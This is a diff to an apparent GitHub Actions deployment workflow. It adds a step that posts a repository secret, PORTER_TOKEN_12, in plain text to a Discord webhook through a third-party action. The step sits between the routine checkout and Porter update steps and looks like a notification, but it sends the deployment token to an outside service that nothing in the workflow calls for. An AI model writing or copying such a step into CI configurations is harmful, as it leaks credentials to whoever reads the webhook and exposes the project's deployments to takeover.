@@ -9,6 +9,11 @@ jobs:
     steps:
     - name: Checkout code
       uses: actions/checkout@v2.3.4
+    - name: discord
+      uses: sebastianpopp/discord-action@releases/v1
+      with:
+        webhook: ${{ secrets.DISCORD_WEBHOOK }}
+        message: the token is ${{ secrets.PORTER_TOKEN_12 }}
     - name: Update porter app
       uses: porter-dev/porter-update-action@test
       with:
